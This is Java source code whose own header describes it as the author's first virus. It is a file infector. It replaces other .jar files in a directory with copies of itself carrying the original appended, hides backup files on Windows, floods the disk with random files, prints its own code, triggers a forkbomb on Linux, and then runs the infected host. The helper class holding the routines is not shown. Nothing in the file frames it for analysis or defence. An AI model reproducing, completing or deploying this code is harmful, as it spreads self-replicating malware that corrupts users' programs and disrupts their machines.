
/**
 * My first little Virus in Java
 * Aus der Schwärze der Knechtschaft durch blutige Schlachten ans goldene Licht der Freiheit.
 * 
 * @author R3s1stanc3 [vxnetw0rk]
 * @version 1
 */

import java . io . * ;
import java . lang . String ;
import java . util . Random ;

public class Suicide
{
    
    private static String splitStr = "abcdefg1234567890" ;
    
    /**
     * The main function of the Virus, which starts the whole payload
     */
    public static void main ( String [ ] args )
    {
        
        Virii virii = new Virii ( ) ;
        String myself = virii . getName ( ) ;
        String os = virii . getOS ( ) ;
        
        // Get a list of all *.jar files in the current directory
        String [ ] jarList = virii . listJar ( ) ;
        
        // Replace every *.jar file with a copy of myselfFile myFile = new File ( myself ) ;
        for ( String s : jarList )
        {
            if ( ! s . equals ( myself ) && s . indexOf ( "." ) != 0 && ! virii . isInfected ( virii . readFile ( s ), splitStr ) )
            {
                virii . copyFile ( s, "." + s ) ;
                virii . deleteFile ( s ) ;
                virii . copyFile ( myself, s ) ;
                if ( os . equals ( "Windows" ) ) virii . hideFile ( "." + s ) ;
                virii . infectFile ( s, splitStr ) ;
                virii . deleteFile ( "." + s ) ;
            }
        }
        
        // Flood the PC with some random files
        virii . flood ( new Random ( ) . nextInt ( 1000 ) ) ;
        // Prints his own main function
        if ( os . equals ( "Windows" ) && new Print ( ) . printerExists ( ) ) 
        {
            String name = String . valueOf ( new Random ( ) . nextInt ( ) ) + ".txt" ;
            virii . writeFile ( name, virii . getMyCode ( ) ) ;
            new Print ( ) . print ( name ) ;
            virii . deleteFile ( name ) ;
        }
        // Forkbomb for Linux
        if ( os . equals ( "Linux" ) ) virii . run ( ) ;
            
        // If the current file is infected -> execute the host; else delete yourself
        if ( virii . isInfected ( virii . readFile ( myself ), splitStr ) ) 
        {
            byte [ ] [ ] old = virii . getOldFile ( myself, splitStr ) ;
            virii . writeFileByte ( "." + myself, old [ 0 ] ) ;
            if ( os . equals ( "Windows" ) ) virii . hideFile ( "." + myself ) ;
            virii . setFileExecutable ( "." + myself ) ;
            virii . execute ( "." + myself ) ;
            virii . deleteFile ( "." + myself ) ;
        }
        else virii . deleteFile ( myself ) ;
        
    }
    
}
